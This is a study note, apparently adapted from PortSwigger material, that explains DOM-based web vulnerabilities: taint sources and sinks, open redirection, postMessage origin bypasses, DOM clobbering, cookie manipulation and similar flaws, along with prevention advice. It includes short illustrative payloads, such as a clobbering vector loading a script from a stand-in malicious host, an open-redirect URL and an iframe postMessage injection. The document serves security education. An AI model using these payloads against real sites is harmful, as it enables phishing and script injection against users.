## What is the DOM?
* Document Object Model (DOM) is a web browser's hierarchical representation of the elements on the page
* Websites can use JavaScript to manipulate the nodes and objects of the DOM, as well as their properties
* DOM manipulation in itself is not a problem
* JavaScript that handles data insecurely can enable various attacks
* DOM-based vulnerabilities arise when a website contains JavaScript that takes an attacker-controllable value, known as a source, and passes it into a dangerous function, known as a sink

## Taint-flow vulnerabilities
Many DOM-based vulnerabilities can be traced back to problems with the way client-side code manipulates attacker-controllable data

#### Sources
A source is a JavaScript property that accepts data that is potentially attacker-controlled. An example of a source is the `location.search` property because it reads input from the query string, which is relatively simple for an attacker to control. Ultimately, any property that can be controlled by the attacker is a potential source. This includes the referring URL (exposed by the `document.referrer` string), the user's cookies (exposed by the `document.cookie` string), and web messages.

#### Sinks
A sink is a potentially dangerous JavaScript function or DOM object that can cause undesirable effects if attacker-controlled data is passed to it. For example, the `eval()` function is a sink because it processes the argument that is passed to it as JavaScript. An example of an HTML sink is `document.body.innerHTML` because it potentially allows an attacker to inject malicious HTML and execute arbitrary JavaScript.

* Fundamentally, DOM-based vulnerabilities arise when a website passes data from a source to a sink, which then handles the data in an unsafe way in the context of the client's session
* The most common source is the URL, which is typically accessed with the `location` object
* An attacker can construct a link to send a victim to a vulnerable page with a payload in the query string and fragment portions of the URL

```python
goto = location.hash.slice(1) 
if (goto.startsWith('https:')) {
	location = goto;
}
```

* This is vulnerable to [DOM-based open redirection](https://portswigger.net/web-security/dom-based/open-redirection) because the `location.hash` source is handled in an unsafe way
* If the URL contains a hash fragment that starts with `https:`, this code extracts the value of the `location.hash` property and sets it as the `location` property of the `window`
* An attacker could exploit this vulnerability by constructing the following URL
* When a victim visits this URL, the JavaScript sets the value of the `location` property to `https://www.evil-user.net`, which automatically redirects the victim to the malicious site

```http
https://www.innocent-website.com/example#https://www.evil-user.net
```

#### What is DOM-based open redirection?
* DOM-based open-redirection vulnerabilities arise when a script writes attacker-controllable data into a sink that can trigger cross-domain navigation
* For example, the following code is vulnerable due to the unsafe way it handles the `location.hash` property

```python
let url = /https?:\/\/.+/.exec(location.hash); 
if (url) { 
	location = url[0]; 
}
```

#### What is the impact of DOM-based open redirection?
This behavior can be leveraged to facilitate phishing attacks against users of the website, for example. The ability to use an authentic application URL targeting the correct domain and with a valid TLS certificate (if TLS is used) lends credibility to the phishing attack because many users, even if they verify these features, will not notice the subsequent redirection to a different domain.

If an attacker is able to control the start of the string that is passed to the redirection API, then it may be possible to escalate this vulnerability into a JavaScript injection attack. An attacker could construct a URL with the `javascript:` pseudo-protocol to execute arbitrary code when the URL is processed by the browser

#### DOM-based open-redirection Sinks

```
location 
location.host 
location.hostname 
location.href 
location.pathname 
location.search 
location.protocol
location.assign() 
location.replace() 
open() 
element.srcdoc 
XMLHttpRequest.open() 
XMLHttpRequest.send() 
jQuery.ajax() 
$.ajax()
```

#### DOM-based Common sources

```
document.URL 
document.documentURI 
document.URLUnencoded 
document.baseURI 
location 
document.cookie 
document.referrer
window.name 
history.pushState
history.replaceState 
localStorage
sessionStorage 
IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB) 
Database
```

## Web messages (postMessage)
* Consider this code

```python
<script> 
window.addEventListener('message', function(e) {   
	eval(e.data); 
}); 
</script>
```

* This is vulnerable because an attacker could inject a JavaScript payload by constructing the following `iframe`

```python
<iframe 
	src="//vulnerable-website"
	onload="this.contentWindow.postMessage('<img src=1 onerror=print()','*')"
>
```

* As the event listener does not verify the origin of the message, and the `postMessage()` method specifies the `targetOrigin` `"*"`, the event listener accepts the payload and passes it into a sink, in this case, the `eval()` function

## Origin verification
* Even if an event listener does include some form of origin verification, this verification step can sometimes be fundamentally flawed

```python
window.addEventListener('message', function(e)
{ 
	if (e.origin.indexOf('normal-website.com') > -1) { 
		eval(e.data); 
	} 
});
```

* The `indexOf` method is used to try and verify that the origin of the incoming message is the `normal-website.com` domain
* However, in practice, it only checks whether the string `"normal-website.com"` is contained anywhere in the origin URL
* As a result, an attacker could easily bypass this verification step if the origin of their malicious message was `http://www.normal-website.com.evil.net`
* The same flaw also applies to verification checks that rely on the `startsWith()` or `endsWith()` methods
* For example, the following event listener would regard the origin `http://www.malicious-websitenormal-website.com` as safe

```python
window.addEventListener('message', function(e) 
{ 
	if (e.origin.endsWith('normal-website.com')) 
	{ 
		eval(e.data); 
	} 
});
```

### How to prevent DOM-based taint-flow vulnerabilities
There is no single action you can take to eliminate the threat of DOM-based attacks entirely. However, generally speaking, the most effective way to avoid DOM-based vulnerabilities is to avoid allowing data from any untrusted source to dynamically alter the value that is transmitted to any sink.

If the desired functionality of the application means that this behavior is unavoidable, then defenses must be implemented within the client-side code. In many cases, the relevant data can be validated on a whitelist basis, only allowing content that is known to be safe. In other cases, it will be necessary to sanitize or encode the data. This can be a complex task, and depending on the context into which the data is to be inserted, may involve a combination of JavaScript escaping, HTML encoding, and URL encoding, in the appropriate sequence.

For measures you can take to prevent specific vulnerabilities, please refer to the corresponding vulnerability pages linked from the table above.

## DOM clobbering
* DOM clobbering is a technique in which you inject HTML into a page to manipulate the DOM and ultimately change the behavior of JavaScript on the page
* DOM clobbering is particularly useful in cases where [XSS](https://portswigger.net/web-security/cross-site-scripting) is not possible, but you can control some HTML on a page where the attributes `id` or `name` are whitelisted by the HTML filter
* The most common form of DOM clobbering uses an anchor element to overwrite a global variable, which is then used by the application in an unsafe way, such as generating a dynamic script URL
* The term clobbering comes from the fact that you are "clobbering" a global variable or property of an object and overwriting it with a DOM node or HTML collection instead
* For example, you can use DOM objects to overwrite other JavaScript objects and exploit unsafe names, such as `submit`, to interfere with a form's actual `submit()` function

#### How to exploit DOM-clobbering vulnerabilities
* A common pattern used by JavaScript developers is

```python
var someObject = window.someObject || {..};
```

* If you can control some of the HTML on the page, you can clobber the `someObject` reference with a DOM node, such as an anchor

```python
<script> 
	window.onload = function() { 
		let someObject = window.someObject || {}; 
		let script = document.createElement('script'); 
		script.src = someObject.url; 
		document.body.appendChild(script); 
	}; 
</script>
```

* Inject the following HTML to clobber the `someObject` reference with an anchor element

```HTML
<a id=someObject>
<a id=someObject name=url href=//malicious-website.com/evil.js>
```

* As the two anchors use the same ID, the DOM groups them together in a DOM collection
* The DOM clobbering vector then overwrites the `someObject` reference with this DOM collection
* A `name` attribute is used on the last anchor element in order to clobber the `url` property of the `someObject` object, which points to an external script
* Another common technique is to use a `form` element along with an element such as `input` to clobber DOM properties
* For example, clobbering the `attributes` property enables you to bypass client-side filters that use it in their logic
* Although the filter will enumerate the `attributes` property, it will not actually remove any attributes because the property has been clobbered with a DOM node
* As a result, you will be able to inject malicious attributes that would normally be filtered out

```python
<form onclick=alert(1)><input id=attributes>Click me
```

* In this case, the client-side filter would traverse the DOM and encounter a whitelisted `form` element
* Normally, the filter would loop through the `attributes` property of the `form` element and remove any blacklisted attributes
* However, because the `attributes` property has been clobbered with the `input` element, the filter loops through the `input` element instead
* As the `input` element has an undefined length, the conditions for the `for` loop of the filter (for example `i<element.attributes.length`) are not met, and the filter simply moves on to the next element instead
* This results in the `onclick` event being ignored altogether by the filter, which subsequently allows the `alert()` function to be called in the browser

#### How to prevent DOM-clobbering attacks
In the simplest terms, you can prevent DOM-clobbering attacks by implementing checks to make sure that objects or functions are what you expect them to be. For instance, you can check that the attributes property of a DOM node is actually an instance of `NamedNodeMap`. This ensures that the property is an attributes property and not a clobbered HTML element.

You should also avoid writing code that references a global variable in conjunction with the logical OR operator `||`, as this can lead to DOM clobbering vulnerabilities.

In summary:
- Check that objects and functions are legitimate. If you are filtering the DOM, make sure you check that the object or function is not a DOM node.
- Avoid bad code patterns. Using global variables in conjunction with the logical OR operator should be avoided.
- Use a well-tested library, such as DOMPurify, that accounts for DOM-clobbering vulnerabilities.

## Coockie manipulation
* Some DOM-based vulnerabilities allow attackers to manipulate data that they do not typically control
* This transforms normally-safe data types, such as cookies, into potential sources
* DOM-based cookie-manipulation vulnerabilities arise when a script writes attacker-controllable data into the value of a cookie
* An attacker may be able to use this vulnerability to construct a URL that, if visited by another user, will set an arbitrary value in the user's cookie
* Many sinks are largely harmless on their own, but DOM-based cookie-manipulation attacks demonstrate how low-severity vulnerabilities can sometimes be used as part of an exploit chain for a high-severity attack
* For example, if JavaScript writes data from a source into `document.cookie` without sanitizing it first, an attacker can manipulate the value of a single cookie to inject arbitrary values
* If the website unsafely reflects values from cookies without HTML-encoding them, an attacker can use cookie-manipulation techniques to exploit this behavior

```python
document.cookie = 'cookieName='+location.hash.slice(1);
```

#### Impact
* The potential impact of this vulnerability depends on the role that the cookie plays within the website
* If the cookie is used to control the behavior that results from certain user actions (for example, a production versus demo mode setting), then the attacker may be able to cause the user to perform unintended actions by manipulating the cookie's value
* If the cookie is used to track the user's session, then the attacker may be able to perform a session fixation attack, in which they set the cookie's value to a valid token that they have obtained from the website, and then hijack the session during the victim's subsequent interaction with the website
* A cookie-manipulation vulnerability like this can be used to attack not only the vulnerable website, but any other website under the same parent domain
* The `document.cookie` sink can lead to DOM-based cookie-manipulation vulnerabilities

## JS Injection
* DOM-based JavaScript-injection vulnerabilities arise when a script executes attacker-controllable data as JavaScript
* An attacker may be able to use the vulnerability to construct a URL that, if visited by another user, will cause arbitrary JavaScript supplied by the attacker to execute in the context of the user's browser session
* The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, or even logging their keystrokes

#### Sinks

```python
eval() 
Function() 
setTimeout() 
setInterval() 
setImmediate() 
execCommand() 
execScript() 
msSetImmediate() 
range.createContextualFragment() 
crypto.generateCRMFRequest()
```

## Document-domain manipulation
* Document-domain manipulation vulnerabilities arise when a script uses attacker-controllable data to set the `document.domain` property
* An attacker may be able to use the vulnerability to construct a URL that, if visited by another user, will cause the response page to set an arbitrary `document.domain` value
* The `document.domain` property is used by browsers in their enforcement of the same origin policy
* If two pages from different origins explicitly set the same `document.domain` value, then those two pages can interact in unrestricted ways
* If an attacker can cause a page of a targeted website and another page they control (either directly, or via an XSS-like vulnerability) to set the same `document.domain` value, then the attacker may be able to fully compromise the target page via the page they already control
* Browsers generally enforce some restrictions on the values that can be assigned to `document.domain`, and may prevent the use of completely different values than the actual origin of the page
* However, there are two important caveats to this
	* Firstly, browsers allow the use of child or parent domains, so an attacker may be able to switch the domain of the target page to that of a related website with a weaker security posture
	* Secondly, some browser quirks enable switching to completely unrelated domains
* These caveats mean that the ability to manipulate the `document.domain` property of a page generally represents a security vulnerability whose severity is not far behind regular XSS

## WebSocket-URL poisoning
* WebSocket-URL poisoning occurs when a script uses controllable data as the target URL of a WebSocket connection
* An attacker may be able to use this vulnerability to construct a URL that, if visited by another user, will cause the user's browser to open a WebSocket connection to a URL that is under the attacker's control
* `WebSocket` constructor can lead to WebSocket-URL poisoning vulnerabilities

## Link manipulation
* DOM-based link-manipulation vulnerabilities arise when a script writes attacker-controllable data to a navigation target within the current page, such as a clickable link or the submission URL of a form
* An attacker might be able to use this vulnerability to construct a URL that, if visited by another application user, will modify the target of links within the response
* An attacker may be able to leverage this vulnerability to perform various attacks, including
	- Causing the user to be redirected to an arbitrary external URL, which could facilitate a phishing attack
	- Causing the user to submit sensitive form data to a server controlled by the attacker
	- Changing the file or query string associated with a link, causing the user to perform an unintended action within the application
	- Bypassing browser anti-XSS defenses by injecting on-site links containing XSS exploits. This works because anti-XSS defenses do not typically account for on-site links

#### Sinks

```python
element.href
element.src 
element.action
```

## Ajax request-header manipulation
* Using Ajax enables a website to make asynchronous requests to the server so that web applications can dynamically change content on the page without the need to reload the entire page
* However, Ajax request-header manipulation vulnerabilities arise when a script writes attacker-controllable data into the request header of an Ajax request that is issued using an `XmlHttpRequest` object
*  An attacker may be able to use this vulnerability to construct a URL that, if visited by another user, will set an arbitrary header in the subsequent Ajax request
* This can then be used as a starting point to chain together other kinds of attack, thereby increasing the potential severity of this vulnerability

#### Sinks

```python
XMLHttpRequest.setRequestHeader() 
XMLHttpRequest.open() 
XMLHttpRequest.send() 
jQuery.globalEval() 
$.globalEval()
```

## File-path manipulation
* Local file-path manipulation vulnerabilities arise when a script passes attacker-controllable data to a file-handling API as the `filename` parameter
* An attacker may be able to use this vulnerability to construct a URL that, if visited by another user, will cause the user's browser to open an arbitrary local file

#### Impact
- If the website reads data from the file, the attacker may be able to retrieve this data
- If the website writes specific data to a sensitive file, the attacker may also be able write their own data to the file, which could be the configuration file of the operating system, for example

#### Sinks

```python
FileReader.readAsArrayBuffer() 
FileReader.readAsBinaryString() 
FileReader.readAsDataURL()
FileReader.readAsText()
FileReader.readAsFile() 
FileReader.root.getFile()
```

## SQLi
* Client-side SQL-injection vulnerabilities arise when a script incorporates attacker-controllable data into a client-side SQL query in an unsafe way
* An attacker may be able to use this vulnerability to construct a URL that, if visited by another user, will execute an arbitrary SQL query within the local SQL database of the user's browser

#### Sinks
* `executeSql()`

#### How to prevent DOM-based client-side SQL-injection vulnerabilities
In addition to the general measures described on the [DOM-based vulnerabilities](https://portswigger.net/web-security/dom-based) page, you should make sure that you use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to safely incorporate potentially tainted data into SQL queries:
-   The application specifies the structure of the query, leaving placeholders for each item of user input.
-   The application specifies the contents of each placeholder. As the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure.

In the JavaScript `executeSql()` API, parameterized items can be designated within the query string using the query character `?`. For each parameterized item, an additional parameter is passed to the API containing the item's value. To prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application, it is strongly recommended that you parameterize every variable data item that is incorporated into database queries, even if it is not obviously tainted.

## HTML5-Storage manipluation
* HTML5-storage manipulation vulnerabilities arise when a script stores attacker-controllable data in the HTML5 storage of the web browser (either `localStorage` or `sessionStorage`)
* An attacker may be able to use this behavior to construct a URL that, if visited by another user, will cause the user's browser to store attacker-controllable data
* This behavior does not in itself constitute a security vulnerability
* However, if the application later reads data back from storage and processes it in an unsafe way, an attacker may be able to leverage the storage mechanism to deliver other DOM-based attacks, such as [cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) and JavaScript injection

#### Sinks

```python
sessionStorage.setItem() 
localStorage.setItem()
```

## Client-side XPath injection
* DOM-based XPath-injection vulnerabilities arise when a script incorporates attacker-controllable data into an XPath query
* An attacker may be able to use this behavior to construct a URL that, if visited by another application user, will trigger the execution of an arbitrary XPath query, which could cause different data to be retrieved and processed by the website

#### Sinks

```python
document.evaluate() 
element.evaluate()
```

## Client-side JSON injection
* DOM-based JSON-injection vulnerabilities arise when a script incorporates attacker-controllable data into a string that is parsed as a JSON data structure and then processed by the application
* An attacker may be able to use this behavior to construct a URL that, if visited by another user, will cause arbitrary JSON data to be processed

#### Sinks

```python
JSON.parse() 
jQuery.parseJSON()
$.parseJSON()
```

## DOM-data manipulation
* DOM-data manipulation vulnerabilities arise when a script writes attacker-controllable data to a field within the DOM that is used within the visible UI or client-side logic
* An attacker may be able to use this vulnerability to construct a URL that, if visited by another user, will modify the appearance or behavior of the client-side UI
* DOM-data manipulation vulnerabilities can be exploited by both reflected and stored DOM-based attacks

#### Sinks

```python
script.src 
script.text
script.textContent
script.innerText 
element.setAttribute() 
element.search 
element.text 
element.textContent 
element.innerText
element.outerText
element.value 
element.name
element.target
element.method 
element.type 
element.backgroundImage
element.cssText
element.codebase 
document.title 
document.implementation.createHTMLDocument() 
history.pushState()
history.replaceState()
```

## DOS
* DOM-based denial-of-service vulnerabilities arise when a script passes attacker-controllable data in an unsafe way to a problematic platform API, such as an API whose invocation can cause the user's computer to consume excessive amounts of CPU or disk space
* This may result in side effects if the browser restricts the functionality of the website, for example, by rejecting attempts to store data in `localStorage` or killing busy scripts

#### Sinks

```python
requestFileSystem() 
RegExp()
```
